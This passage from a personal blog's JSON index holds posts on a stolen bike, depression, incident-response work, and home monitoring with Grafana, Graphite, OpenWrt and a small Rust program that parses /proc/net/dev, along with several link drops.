notices, that I forgot to lock the bike correctly. Be more careful next time I told myself. Seems like it didn\u0026rsquo;t work.\nBut this post is not to cry about someones misdeed, instead, it should be a act of farewall. It was a good bike, one that has carried me day in day out from one part of town to another.\nIt carried me through my time at university and somehow, somewhen I grow up with it. For seven years I biked it and boy did many things broke. I do not know often I had to replace the tires. They broken often and at the worst time. In middle of the way to work with no repair shop for the next 10 Km? Next was the chain that was worn down quickly. For once because it was used each time of the year and second it was outside for that the time as well.\nWhen I started to work I had a workshop with some oversized posters. Because I needed it the next day, I picked them up by bike. The problem was that parts of the posters where on different locations, hence, I transported them. Imaging having three to five oversized posters, some clipped onto the bicycle rack, but barley stable and the remain carried by hand. Every now and then I had to stop to re-adjust not to lost anything. But my bike carried it disregard.\nSo, goodbye my bike. Thank you for the great time!\n","permalink":"https://blog.akendo.eu/post/2021-11-10-bike/","tags":["100DaysToOffload"],"title":"Bike"},{"categories":["General"],"contents":"This is kind of my first blog post in ages. Technically, I’ve composed some more in between, however, much of them were really just halfhearted. The reason why? I was depressed.\nThis was a surprise for two reasons. First, the fact that I was depresses at all. I had many people around me that suffered from depression. I know what it looks like, however, that I might be affected of it seemed so odd.\nThe problem is that depression does not always manifest itself with the same way, and that makes it more difficult to spot. Also, the fact that I never really had it before. Hence, it was rather hard to see myself from outside.\nNext was when or how it became evident because once you have the realization it changes a lot. It happened when someone made a comment about my behavior regarding motivation with the comment\u0026gt; “You’re just hanging around like you’re depressed.”\nThat was hurtful, why? Hmm…yeahr because it was true, and I didn’t want it to. At least a bit.\nThe exhaust and the anger I felt at the time was the sign. However, everyone is exhausted and angry at times, right? Also, we were kind of out of the worst of the pandemic and I started to work again after a year of parental leave. Things seemed to go upward. Except there was an unresolved conflict and more things that seemed to get out of control. People responded in the worst way and communication stops. At least for a moment, so things seemed to go resolved, right? I just got angry at countless things.\nThe problem was the way the anger was manifesting. I hold back the conflicts because I wasn’t able to solve them. There were many factors to it, but the anger showed me that. I should mention that I almost never gets angry. All of that felt very personal.\nI felt like to know the way and was just missing the necessary energy. It will come back eventually, right?\nBut it didn’t, and this should have been the first alter. I stop engaging in things that I usually like to do. It costed me so much energy to progress the conflict that nothing was left for things like writing for this blog. Instead, I was getting more and more entangled in a conflict. This lead to a rather different pattern in me: The tendency to withhold myself.\nSuddenly, I tried to avoid things, people, work. To save energy. To get back on track and the more I’ve tried to solve it the more it consumed me. The more I’ve tried to make sense of it, the more it drains me down. When I took all my energy to make things work I was hit by the most unexpected responses ever: The conflict entrepreneur was not even willing to resolve any conflict, in his view there were none. It was defeating.\nAt some point, a thing or two happened and I snapped. It couldn’t go on that way, and I had to change. I quit my job and the one source of the depression to me. Normally, I love working. But in these last months it turned into a nightmare. I might reflect more on what went down or how it was (not) successful resolved. But that’s it for the moment.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-11-02-depression/","tags":["100DaysToOffload"],"title":"Depression"},{"categories":["iPhone","security"],"contents":" Breaking the News: New York Times Journalist Ben Hubbard Hacked with Pegasus after Reporting on Previous Hacking Attempts - The Citizen Lab ","permalink":"https://blog.akendo.eu/flash/26.10.2021-linkdrop/","tags":["News"],"title":"26.10.2021 - link drop"},{"categories":["Task"],"contents":"I\u0026rsquo;m using the task warrior report function called timesheet. It will return a list of done tast of the past weeks. In the latest version this was change and suddenly it return more than the week I need it for. Within the man page we see that there is the possiblity to set an alternating weeks value as a parameter. However, it is not certain how this will be done based on the man page.\nAfter checking of the source code it got more clearn. However, only after reading the code for the tests it become understandable:\ntask timesheet \u0026#39;(+PENDING and start.after:now-1wk) or (+COMPLETED and end.after:now-1wk)\u0026#39; So far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-10-17-task-custom-time-range/","tags":["100DaysToOffload"],"title":"[Task Warrior]Setting a custom time range for the timesheet report"},{"categories":["News"],"contents":" Fear of Failure, Overanalyzing, and Escaping into Fantasy ","permalink":"https://blog.akendo.eu/flash/08.09.2021-linkdrop/","tags":[""],"title":"08.09.2021 - link drop"},{"categories":["News"],"contents":" `\n","permalink":"https://blog.akendo.eu/flash/02.09.2021-linkdrop/","tags":[],"title":"02.09.2021 - link drop"},{"categories":["News"],"contents":" The 1 Percent Rule: Why a Few People Get Most of the Rewards The surprising habits of original thinkers | Adam Grant - YouTube [](https://www.youtube.com/watch?v=StQ_6juJlZY \u0026lsquo;What is a Browser Security Sandbox?! (Learn to Hack Firefox) - YouTube\u0026rsquo; ","permalink":"https://blog.akendo.eu/flash/25.08.2021-linkdrop/","tags":[],"title":"25.08.2021 - link drop"},{"categories":["psychology"],"contents":" Compartmentalization (psychology) - Wikipedia CompartmentalizationForbidden - Psychology Today ","permalink":"https://blog.akendo.eu/flash/24.08.2021-linkdrop/","tags":[],"title":"24.08.2021 - link drop"},{"categories":["News"],"contents":" Feeling vs Knowing - by hermitsings - hermitsings’s Stop Nitpicking in Code Reviews gm techniques - How do I learn to become a good GM? - Role-playing Games Stack Exchange tools - What is the single most influential book every GM should read? - Role-playing Games Stack Exchange Where can I find transcripts of actual game sessions? - Role-playing Games Stack Exchange gm techniques - What is a good way to become a better NPC/monster actor? - Role-playing Games Stack Exchange Don’t fight, flight (or freeze) your body and emotions | by Piotr Migdał | Medium Elizabeth R Thornton - Do You Have an External Validation Mental Model? ","permalink":"https://blog.akendo.eu/flash/04.08.2021-linkdrop/","tags":[],"title":"04.08.2021 - link drop"},{"categories":["News"],"contents":" The gender biases that shape our brains - BBC Future ","permalink":"https://blog.akendo.eu/flash/15.07.2021-linkdrop/","tags":[],"title":"15.07.2021 - link drop"},{"categories":["News"],"contents":" Tools and Jewels ","permalink":"https://blog.akendo.eu/flash/14.07.2021-linkdrop/","tags":["Security"],"title":"14.07.2021 - link drop"},{"categories":["News"],"contents":" SensePost | Tip toeing past android 7’s network security configuration DOM Elements – React ","permalink":"https://blog.akendo.eu/flash/05.07.2021-linkdrop/","tags":["Security","Android","NodeJS","React"],"title":"05.07.2021 - link drop"},{"categories":["News"],"contents":" \u0026lsquo;Hidden Property Abusing\u0026rsquo; Allows Attacks on Node.js \u0026hellip; Abusing Hidden Properties to Attack the Node.js Ecosystem | USENIX Abusing Hidden Properties to Attack the Node.js Ecosystem Fixing a 16 year-old Privacy Problem in TLS with ESNI | SentinelOne Good-bye ESNI, hello ECH! Developer Roadmaps Understanding the tools/scripts you use in a Pentest | Offensive Security ","permalink":"https://blog.akendo.eu/flash/03.07.2021-linkdrop/","tags":["Security","Node","SSL"],"title":"03.07.2021 - link drop"},{"categories":["News"],"contents":" Selfish vs. Selfless: Self-Promotion in Communities - The Bootstrapped Founder I wish I could write this well | RoyalSloth ","permalink":"https://blog.akendo.eu/flash/28.06.2021-linkdrop/","tags":[],"title":"28.06.2021 - link drop"},{"categories":["News"],"contents":" What is two-way TLS?. TLS and its predecessor, SSL are… | by Ben Pournader | Medium ","permalink":"https://blog.akendo.eu/flash/14.06.2021-linkdrop/","tags":["TLS"],"title":"14.06.2021 - link drop"},{"categories":["News"],"contents":" (DE)Golem.de: IT-News für Profis GitLab.org / security-products / analyzers / fuzzers / Jsfuzz · GitLab Analysis of HSTS Caches of Different Browsers – Insinuator.net ","permalink":"https://blog.akendo.eu/flash/11.06.2021-linkdrop/","tags":["Security","RBA","fuzzer","JS"],"title":"11.06.2021 - link drop"},{"categories":["Linux"],"contents":"For the Hedgedoc migration, I had to create a new role and forgot to add the necessary permissions to allow this role to login.\npsql -U postgres ALTER ROLE \u0026#34;hedgedoc\u0026#34; WITH LOGIN; Source: permissions - PostgreSQL: role is not permitted to log in - Stack Overflow\n","permalink":"https://blog.akendo.eu/post/2021-06-10-postgresql-user-login/","tags":["100DaysToOffload","postgres"],"title":"Postgresql User Login"},{"categories":["Crypto"],"contents":"Today, I’ve learned that there is something like a Cryptographic Agility. I was a bit confused about this term, however, it turns out that this describes the concept of varying parameters like cryptographic hash function (MD5, SHA-1 and so) are not fixed in system but could be adapted. SSH, for instance, reflect this by not only using RSA for the fingerprint but ed25519 as well.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-06-08-cryptographic-agility/","tags":["100DaysToOffload"],"title":"Cryptographic Agility"},{"categories":["Blog"],"contents":"This is my first post composed on my phone. It took some time to get here, but it’s finally done!\nThe process is just odd at the moment. I\u0026rsquo;m using vim on an Android, which doesn\u0026rsquo;t seem to be the intended way, but it is working!\nThe deployment chain isn\u0026rsquo;t ready yet, meaning that the deployment is still done from hand., however, having the phone able to access the blog sources seems to be the best way to get things more written. Hugo does have a native Android app and doesn’t work on the phone and this adds a bit of complexity at the moment. I’ve installed Termux, that support all the tools I need to keep blogging locally.\nThis way I can run Hugo, check the written text and push to git. Android supports tools for git and editing, but the overall process is just bad to get done in Android.\nMy overall impression is that Android dislikes you to have various application working on the same data. I might be wrong, but using Android this way is just painful.\nIt is sad to see, that running a terminal emulation with bash is the beat tool…my needs are most likely just special…\nHowsoever, I hope to get more writing done for the blog.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-06-05-phone/","tags":["100DaysToOffload"],"title":"Phone"},{"categories":["News"],"contents":" The benefits of note-taking by hand - BBC Worklife A writing tip I learned at Oxford - Timber\u0026rsquo;s Newsletter ","permalink":"https://blog.akendo.eu/flash/30.05.2021-linkdrop/","tags":["Notes"],"title":"30.05.2021 - link drop"},{"categories":["Work"],"contents":"Since two weeks, I’m back at work and boy the first weeks were quite hectic. I was involved in help some security incidents and that required my fullest of my attention. Afterwards, I wasn’t much in the mood to write.\nFor once, that related to the fact that much of the work was quite reactive, but also because you need to find a way to cope with the different amount of time that is at your disposal. One of the cases was a ransom attack and in my view these things are just nasty. You’ll be pressured to pay, and they use any trick in the book to get you to comply. But the worst part is, that there are groups who just not care enough to ensure that the data are decryptable. Making the choice to comply even more difficult.\nThere is a bit of a fun thing: some ransom groups seems to have an odd ethics code. Whenever they learn who the victim is, and it includes doctors or medicine they kind of put down the ransom quite by lot.\nNevertheless, you still need to handle the technical reality and being confronted to help someone to get his data back and to commend him what to do makes things quite different. The real work lies in the people and not in the technical systems.\nIt becomes even worse, when the few technical people around the person effect of it, are not willing to help. Kicking others ass to do get the work done isn\u0026rsquo;t part of my job.\nAt the end of the day you just everything going. You do not take the time anymore take care for more trivial things and let much of your daily routing come to a halt. Whenever things change more drastically in my life, much of my habits go down, and it takes a few weeks to get back in to the habit zone.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-05-14-working/","tags":["100DaysToOffload"],"title":"Working"},{"categories":["News"],"contents":" This Week in Rust 388 · This Week in Rust RIP config.php hello classes/config.php - #24 by Hypfer - Development - Tiny Tiny RSS: Community GlobalConfig - tt-rss - Tiny Tiny RSS ","permalink":"https://blog.akendo.eu/flash/07.05.2021-linkdrop/","tags":["Rust","ttrss"],"title":"07.05.2021 - link drop"},{"categories":["review"],"contents":"This post is a bit late, however, better than missed out. It is a reflection about the last week.\nSo what went wrong in the past two weeks? I didn\u0026rsquo;t had the time and motivation for writing. The problem is that when you care for someone else, you do not have the mind to take the time to blog. While some time spots occurs that might allow doing so, you rather spend the time for restoration. However, what I was able to post in this week make me happy. I’ve skipped one review or rather kept it to a bare minimal.\nOne important detail: This marks my 80th post1! That’s quite nice. In the coming weeks, I’m going to work again and wouldn’t have as much time as planned. The first week at work might be still relaxed enough to me, but with 20 posts left to go for this challenged, I’m not sure how well I’m able to post in the coming weeks.\nTo cope, i’ve tried to reduce the effort for each post. Instead of spending hours in rewriting paragraphs, I just pushed them post out. This feels odd, however, putting posts out with the idea that you have limited amount of time, help to train for the everyday reality. Funny, this posts takes already more than one hour of time in the making…\nPV (Part seven) Rust (Part three) kernel exploration (First chapter completed) nftables Blog CI/CD (Part three) I wrote about the PV panel and Grafana, I made a side-step to write about Netstat, include the big problem of the TCP_WAIT state. These were a huge topic for me, because I’ve worked on the for a long time on them. They have been in the backlog to write about this for a long time too. When I’m finished with the smaller posts, I might create a bigger post with all these posts summaries to a single one. Also, I’m going to rewrite some paragraphs as well I think, but that’s music for later.\nI really want to get back to do more for my blog, however, I was met with some odd problem with some migrated services. For some reason the Task Warrior Server (taskd) wasn’t working. Besides, I\u0026rsquo;m going to the first work related meetings in this week, hence, time that was planned for blogging will go into work instead.\nToday, I’m going to plan what I might write into the blog.\nPV: Writing about my adjustments to the Python program to get the data from the smart Plug into my Grafana server CI/CD and nftable : issues when running a Site-to-Site VPN with the routing I’ve try to write about a bug I had some years ago with the netrc and Ansible Some though about fear in our society My extended usage of graphite The idea of cognitive entrenchment It is safe for me to assume, that I won’t able to get them out by then of this week, however, I think this add direction what I’m going to write about. Some of them might be worth splitting up.\nFor the topic in regard to the kernel exploitation, I need some time to go through the material and start to make some notes. The next chapter is about creating an environment, so whenever I have some time to spare, I might do this.\nSo far, akendo\nTechnically, this is the 82st post.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-04-26-review-cw16/","tags":["100DaysToOffload"],"title":"Review CW16"},{"categories":["PV"],"contents":"This post continues on the post from 12 of January[0].\nWith the PV connected to the grid, I wanted to ensure what power is injected. For this I used a power meter with an LCD. This is a nice way to see what’s the power of the given moment or the power overall. However, this is quite some effort to do. Every day, I have to write down what the value was and the position of the socket was everything but user-friendly. Additionally, to this, there was the problem of not being always around. I went to camp and wasn’t home to write down the recorded power.\nSo I had some time to think about how to cope with this. For another idea of mine I’ve checkout something called smart sockets:\nThese are some small chips with a giant relay attach to it. It allows to power up or down a connected device. In the image we can see a power socket we toyed around during the CCCamp. The problem with many of these sockets is the vendor have created a cheap device, that can only be operated by them via the cloud, and even the basic server operation isn’t ensured.\nInstead, I decided to search for a privacy-friendly alternative that might also include power metering. I found this one:\nA TP-Link HS-110 with a power meter included. The best part is, that you do not need to put them online. You can control the entry thing locally. There is a good YouTube video of the disassembling of the given devices to option a better understanding of the device:\nTo read data from the project you can use this GitHub project[1] that allows to send commands to the devices within you local network.\nso far,\nAkendo\n[0] https://blog.akendo.eu/post/2021-01-12-pv-power-recording/ [1] https://github.com/softScheck/tplink-smartplug\n","permalink":"https://blog.akendo.eu/post/2021-04-25-automated-power-recording/","tags":["100DaysToOffload"],"title":"Automated Power Recording"},{"categories":["PV"],"contents":"There is more to the Netstats subject, but I\u0026rsquo;m going to continue with that later on. Once you have data in graphite you can read them via Grafana. This process is dead simple, and I’m not going to spend time on that.\nOne interesting lesson is the following: When you’re able to control the incoming data via your client, make sure to limit them accordingly. In a later state of the project my client started to reported nonsense data into graphite and that made things a big odd.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-04-24-grafana-part3/","tags":["100DaysToOffload"],"title":"Grafana Part3"},{"categories":["PV","Rust"],"contents":"The next part excites me, I’ve been working on this code on different occasions for some years now. This post is a cross-posting, it lay ground for the Grafana infrastructure that I’m using and taught me a lot about data, rust and how to get the data to render. While it is not directly related to the PV topic itself, it is worth taking the time to consider the lesson to be learned here.\nWhen I realized, that the hack with bash was very ineffective, I was thinking, what could I do instead? Normally, I would have done something tougher with Python. However, running python on an embedded device is terrible. The Router of mine has 16Mbyte of storage on a NAND flash. The default python installation requires around 50 MB.\nBehold! There is an embedded version of python! Yeah… but this take also at least 15 MB. The base image requires more than one MB to get started. So python wasn’t an option. The same is true for ruby, Perl and other languages with an interpreter. They just don’t do it.\nAt the time, I was helping to teach computer security in the university and many students there were talking about rust. After a lecture, I got curious and started to learn about it. Back then I didn\u0026rsquo;t had any problem that could be solved with it.\nFor an Android project I need to have an API for my HTTP service running. Hence, I\u0026rsquo;ve tried to use rust with rocket.rs[] for this. However, I failed because I didn\u0026rsquo;t had the necessary skills in rust to get it running.\nFast forwarding some months to my problem with the Router and the interface data. Once, I’ve realized the terrible hack I did, rust seem just as a naturally choice to me here.\nStep by step The first prototype was just if I’m able to read a file. I’ve started to read the hostname and boy, that was different. In someway, you’re reminded to C, yet it is not C. The underlying logic is, the handling logic is not.\nHowever, at the time, I had to write Java Code for an Android project and Rust seemed so much of a better language to me. The thing about this statement is, I can not even argument why this is. It just feels so much better to me than any language I’ve used so far. WTF?\nOnce I’ve read the hostname of proc, I moved on to the network interface file in proc. This turned our to be more different, because you need to write a parse to handle the different interfaces.\nThe PoC looked like this:\npub fn read_traffic_file() -\u0026gt; Vec\u0026lt;String\u0026gt; { let mut f = File::open(\u0026#34;/proc/net/dev\u0026#34;).unwrap(); let mut data_to_return: Vec\u0026lt;String\u0026gt; = Vec::new(); let mut buffer = String::new(); let mut new_data: String = String::new(); f.read_to_string(\u0026amp;mut buffer).unwrap(); // This can be done by the line() function // https://doc.rust-lang.org/std/string/struct.String.html#method.lines let mut data: Vec\u0026lt;\u0026amp;str\u0026gt; = buffer.split(\u0026#34;\\n\u0026#34;).collect(); // Cleanup the Vector, remove unnecessary lines data.reverse(); data.pop(); data.pop(); data.reverse(); data.pop(); // At this point out Vec only contains interface parameters. for line in 0..data.len() { new_data = clean_up(data[line]).clone(); data_to_return.push(new_data); } //println!(\u0026#34;{}\u0026#34;, new_data); data_to_return } fn main() { let mut interface_data: Vec\u0026lt;String\u0026gt; = read_traffic_file(); for interface in 0..interface_data.len(){ extract_interface_data(interface_data[interface].as_str()); } let now_in_s = get_unix_time(); println!(\u0026#34;{:?}\u0026#34;, now_in_s); let hostname = get_hostname(); println!(\u0026#34;{:?}\u0026#34;, hostname); The code wasn’t good, nor something to be proud of. However, it did work and that was mattered to me.\nOne of the bigger problem that then occurred to me was the formatting of the data. Here is the lesson: make sure that you format the in the correct order. Somehow I mixed up the date and the bytes and was wondering why nothing was showing in the graph…\nSo far,\nakendo\n[] https://rocket.rs/\n","permalink":"https://blog.akendo.eu/post/2021-04-23-netstats/","tags":["100DaysToOffload"],"title":"Netstats"},{"categories":["Blog"],"contents":"I did not manage to publish a post the recent days, and I’m wondering why. It might be a problem with my planning. I notice, that I often do not plan much ahead when it comes to blogging.\nMy process relies on having a fixed point of time when I start to work on something. Often things are written as I go. I guess the first problem is abstraction. Because to write something including to have a sense or direction where something should go. Planing includes to distingué between the intent and the abstraction.\nHandling abstraction is always more effort for planning. Because it requires attentiveness to get it right. When you say: I’m planning to write about Rust. It does not include a specific topic, instead, it might be everything that relates to it. When my planning is that ambiguously it might be not that effective.\nAt this moment I have to put the abstraction into the moment and deal with it when the moment arises. This fosters the problem when you’re in a low-energy state you won’t do it. When you spend then entry day busy with something you do not have the energy to decide what you’re going to write about.\nPlanning means to take a decision and define exactly what’s the matter is. But that means to cope with a complexity before it arises. I guess here is a problem of mine. The scope of what I try to do or express grows. There are more complexity that for what I’ve planned, and suddenly you\u0026rsquo;re in need to adapt on the fly.\nNow here comes a question: Do you stick to the plan or do you adapt?\n","permalink":"https://blog.akendo.eu/post/2021-04-19-thinking-ahead/","tags":["100DaysToOffload"],"title":"Thinking Ahead"},{"categories":["News"],"contents":" Coping Mechanisms: Dealing with Life’s Disappointments in a Healthy Way ","permalink":"https://blog.akendo.eu/flash/14.04.2021-linkdrop/","tags":["coping","psychology"],"title":"14.04.2021 - link drop"},{"categories":["PV"],"contents":"So the next step was to write a simple loop in bash and get every second the data. That seemed nice, but it had some big problem: You can’t pipe constantly data to a network connection. At least without any help. Yacks\u0026hellip;\nHere a 2021 note to this: is not quite true with the pipe. However, I just learned it quite recently that the pipe has an aggressive cache. My data were just cached until a threshold is reached. Using that little data it takes quite some time to reach it. I just didn’t know back then.\nBack to the topic, my data were send to the graphite service, and I was happy. Here is the catch: For some reason the connection started to hang. It seldom happened, but it happened. It took me a moment to figure out why. Just until I check the output of the netstat. There was awaiting something odd for me. My list of connections were filed up with a for me unknown TCP state: TCP_ WAIT.\nThe kernel needs to wait I did some searching through and found some useful things. The kernel has a security extension to prevent TCP port reuse attacks. It does so by waiting up to 30 seconds before the kernel closes a closed port.\nThere is a great stack overflow post that explain this in more detail[0] and a blog post[1] too.\nWhen you learn about a TCP connection you learn the various states, however, they do not tell you the full truth, because in reality the OS has to cope with some more failure states than being reached. So TCP_WAIT is a rather uncommon situation, but it is necessary.\nThe reason for this feature exists is a security one: An attack might try to control the port that are used for connection made from the host to another system. By exhausting the port he tries to guess the possible ports and potentially forget connections. With TCP_WAIT the kernel avoid this because a given port is re-used after a given period of time. I think an example for that is the Kaminsky attack. But it also helps in coping with TCP TIME_WAIT Assassination[2].\nDo not mix this up with a SYN Flood attacks. Because the connection is unclosed in such an attack, the kernel needs waits until the connection timeouts. The attack try to avoid sending a FIN package. The important different here is that there is a client (or clients) that create many connections to a socket and closes them! Mean that the kernel has finish the connection. BUT after completing it, it says the socket remains ‘occupied’ by keep these sockets open in the TCP_WAIT state.\nIn short TCP_WAIT describes not a half open connection, but an already completed one. It just waits a while before it allows re-using the socket again. We can see this in the State Diagram below:\nHow long does the kernel wait before it allow this to reuse? Depending on the Maximum Segment Lifetime (MSL). It should be around 1 up to 2 minutes. Some write it is even something like 3 minutes. Tast last entry I found on my system can be found in /proc/sys/net/ipv6/tcp_fin_timeout and consist of 1 minute.\nImplications While this seems good to know, I feared that my router may turn shut because it couldn\u0026rsquo;t handle any new connections. So I\u0026rsquo;ve started to dig into some alternatives. At first sight the CPU recycling seems to be right thing. However, this is also a bad idea that was removed in more recent kennel. After some searches further, I\u0026rsquo;ve decided to compose a more proper solution for these problem. Instead of handling it on the server side, why not just fix my shit? But more of this in the next post.\nSo far,\nAkendo\n[0] https://networkengineering.stackexchange.com/questions/19581/what-is-the-purpose-of-time-wait-in-tcp-connection-tear-down [1] https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux#purpose [2] https://tools.ietf.org/html/rfc1337 [3] http://www.serverframework.com/asynchronousevents/2011/01/time-wait-and-its-design-implications-for-protocols-and-scalable-servers.html [4 ] https://serverfault.com/questions/23385/huge-amount-of-time-wait-connections-says-netstat\n","permalink":"https://blog.akendo.eu/post/2021-04-12-grafana-part2/","tags":["TCP","wait","TCP_WAIT","100DaysToOffload"],"title":"Grafana Part2 - waiting sockets"},{"categories":["review"],"contents":"This last week was suffered the typical post-easter slowness. It takes some time to get back to business as usually. Besides, of these, I also have difficulty in getting back into blogging at the moment. Not sure how I should get back into it, there is just much to be done.\nYet, I’m happy about the rust program I develop and that I manage to blog about. Also, the next post for rust is around the corner !\nShort: Everything have moved on so slightly.\nI made progress with the Grafana post, because I’m able to use the hackmd services again! The post there I split, also, it is a good cross posts for the PV topic, hence, it will also touch rust. Going through these post show me a lot of mistakes I’ve made and helped me to understand much more about things once more!\nPV (Part three) Blog CI/CD (Part three) Rust (Part two) kernel exploration (First chapter completed) nftables The Infrastructure is more in place. There are however other problems. My task warrior broke down, and I do not know why. Also, my VPN restarted suddenly, and I had to cope with my non-persistent nftable rules, again I learned more about nftable. So it helps to progress the nftables subject too.\nIn this week I’m going to be on the way, so I do not know how much time I have to blog while being on the road. But I guess I can return to the CI.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-04-11-review-cw14/","tags":["100DaysToOffload"],"title":"Review CW14"},{"categories":["PV"],"contents":"This is a follow-up post for my PV and Power Recording. Before I continue on the next step, it is necessary to make a side-step. This means, I\u0026rsquo;m going to write about the follow-up about something completely different that becomes vital in the blogging process later. This is a recap of some old notes that I tried to scrap tougher to write a post. It lingers for 1 ¹/2 years in my to-do list and I though it might be a good addition to the series to make sense as a whole.\nGrafana, network statistics and TCP TIME_WAIT I’ve started to collect statistical data with Grafana since 2018. At first it was just some data with no real implication and for fun. However, ever since I’m fascinated with data provided by Linux. The kernel provides a variety of information to work. In my mind I had the idea to record the traffic statistics of my router. For a long time this was not possible, but since I’ve installed OpenWrt on my router this has changed. With a shell required I can utilize data from the kernel.\nMost of this data can be found within the /proc/net/dev file. Here is an example:\nInter-| Receive | Transmit face |bytes packets errs drop fifo frame compressed multicast|bytes packets errs drop fifo colls carrier compressed tun0: 4468821252 36751158 0 0 0 0 0 0 2089659707 23613660 0 6768 0 0 0 0 lo: 18444634266 83603776 0 0 0 0 0 0 18444634266 83603776 0 0 0 0 0 0 ens10: 2314024641 23239927 0 0 0 0 0 0 6064828263 37434243 0 0 0 0 0 0 eth0: 8557466066 29895469 0 0 0 0 0 0 7514729065 28464243 0 0 0 0 0 0 For a different project, I had installed Grafana. So, how do I get the data from my Router to Grafana?\nbash all the way My first solution was fairly primitive. You\u0026rsquo;re going to see how this continues to develop over the course of time. To start we will log into the router and run cat on the /proc/net/dev. This output will be truncated:\ncat /proc/net/dev|grep wlp3s0 |awk '{print $2,$10}' With that cat command you\u0026rsquo;re getting the amount of bytes there were received and transmitted by interface wlp3s0. Wrap it on your laptop in ssh, and we have the data!1 What you\u0026rsquo;re getting back are simple values counted in bytes in that moment in time. This is odd, because usually we handle network traffic in bit. Anyway, the next step is to format the given value.\nBefore I continue, I need to write that I do not use InfluxDB anymore. Instead, I’m using Graphite. Unlike InfluxDB it seemed to be simple in adding data into the storage. Also, I started to run it with the docker container. It provides all the necessary thing you need:\ndocker run -d \\ --name graphite \\ --restart=always \\ -p 80:80 \\ -p 2003-2004:2003-2004 \\ -p 2023-2024:2023-2024 \\ -p 8125:8125/udp \\ -p 8126:8126 \\ graphiteapp/graphite-statsd And putting some data into the service we run:\necho \u0026quot;foo.bar 1 `date +%s`\u0026quot; | nc localhost 2003 To change the data we had from the /proc/net/dev to a fitting format we execute:\necho openwrt.network.wlp3s0.receive (cat /proc/net/dev | grep wlp3s0 |awk '{print $2}') (date +%s) openwrt.network.wlp3s0.receive 10858659523 1618172800 Back when I did this the first time, I’ve used a script to go through the entry devices files and read all interfaces. I’ve lost that part, but for this post I think this is enough.\nDownside to the bash That approach had several disadvantages: each request takes fairly long because each connection would require a new SSH handshake. This could be worked around by having a persisting ssh tunnels, however, the strain it had onto the CPU is huge. It is for the reason that this is a OpenWrt router and the MIPS CPU does not have much processing power at hand.\nAlso, the result would be printed onto my local system and needed to be forward afterwards to the graphite service. It was not fault tolerant at all…\nIn the next post we\u0026rsquo;re going to see some other problems too.\nSo far,\nakendo\nPlease forgive me for this terrible hack. Back then in 2017 this seemed to be good idea.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-04-11-grafana/","tags":["100DaysToOffload"],"title":"Grafana"},{"categories":["Rust"],"contents":"In the past days, I\u0026rsquo;ve been busy with the migration of my old server. My new server requires some sort of monitoring. I\u0026rsquo;m using graphite and this works best with collectd. After a quick installation I went through the different modules and data collectd is sending.\nI love seeing traffic data. However, the interface module is insufficient for my needs. It shows errors and packages that where send. However, for another project I programmed something in rust to get these data: Netstat. It does however add all entries into the graphite server. So I\u0026rsquo;ve deployed it and was good to go.\nHowever, the next day a problem appeared. The data have filled up the entry disk. Why? Turns out, that using docker causes quite a lot of interfaces to be created and because every docker interfaces causes much over head. Particular when you restart container more often, it causes the creation of new interfaces.\nAfter deleting the unnecessary interface data I had to do something. The main problem The program has no filter.\nIt was on my to-do list anyway, so let add some simple filter to reduce the noise of the program.\npub fn read_traffic_file() -\u0026gt; Vec\u0026lt;String\u0026gt; { // Do we need to re-open the file each time or can we just get updates from here? let mut f = File::open(\u0026#34;/proc/net/dev\u0026#34;).unwrap(); let mut data_to_return: Vec\u0026lt;String\u0026gt; = Vec::new(); let mut buffer = String::new(); let mut _new_data: String = String::new(); f.read_to_string(\u0026amp;mut buffer).unwrap(); // This can be done by the line() function // https://doc.rust-lang.org/std/string/struct.String.html#method.lines let mut data: Vec\u0026lt;\u0026amp;str\u0026gt; = buffer.split(\u0026#34;\\n\u0026#34;).collect(); // Cleanup the Vector, remove unnecessary lines data.reverse(); data.pop(); data.pop(); data.reverse(); data.pop(); // At this point out Vec only contains interface parameters. for line in 0..data.len() { _new_data = clean_up(data[line]).clone(); data_to_return.push(_new_data); } data_to_return } Here is the code that read though the list of interfaces, and we’re going to add the filter for the interfaces.\nI’m not sure whether you could to this better or not, however, it was my first code to read lines. Hence, it isn’t the best code for doing it so. But when I had the time to fix it, it was focus on fixing the bug instead of improving the code quality. We update the function parameters to handle some input interfaces, that will be stored in a Vec.\nWriting this, I was thinking about this type str. This works well because I define it within the code. My initial ideas was a String, which makes sense when you would read the file out of a parameter from cmd or a configuration file. Anyway, it works for the moment.\nLet move on to filter lo first.\npub fn read_traffic_file(filter_interfaces: \u0026amp;Vec\u0026lt;\u0026amp;str\u0026gt;) -\u0026gt; Vec\u0026lt;String\u0026gt; { // this should read the /prc/net/dev file and extracs interfaces // TodO: adding filter here // Do we need to re-open the file each time or can we just get updates from here? // ToDo: Allow custom files for testing let mut f = File::open(\u0026#34;/proc/net/dev\u0026#34;).unwrap(); // Debug that we have the list of filter interfaces for interface in filter_interfaces { println!(\u0026#34;interface: {}\u0026#34;, interface); } let mut data_to_return: Vec\u0026lt;String\u0026gt; = Vec::new(); let mut buffer = String::new(); let mut _new_data: String = String::new(); f.read_to_string(\u0026amp;mut buffer).unwrap(); // This can be done by the line() function // https://doc.rust-lang.org/std/string/struct.String.html#method.lines let mut data: Vec\u0026lt;\u0026amp;str\u0026gt; = buffer.split(\u0026#34;\\n\u0026#34;).collect(); // Cleanup the Vector, remove unnecessary lines data.reverse(); data.pop(); data.pop(); data.reverse(); data.pop(); // At this point out Vec only contains interface parameters. for line in 0..data.len() { _new_data = clean_up(data[line]).clone(); println!(\u0026#34;Interface data: {}\u0026#34;, _new_data); // Here we do the filter magic: we skip the data addation when we have a postive match let mut _a = _new_data.split(\u0026#34; \u0026#34;); let _interface = _a.next(); //println!(\u0026#34;{:?}\u0026#34;, _interface.unwrap()); if _interface.unwrap() != filter_interfaces[0] { println!(\u0026#34;True\u0026#34;); data_to_return.push(_new_data); } } data_to_return } This works well for a single entry, however, I also have to add arbitrary amount of interfaces. So we put this statement into a loop. At this point I run into the follow error:\nno implementation for `str == 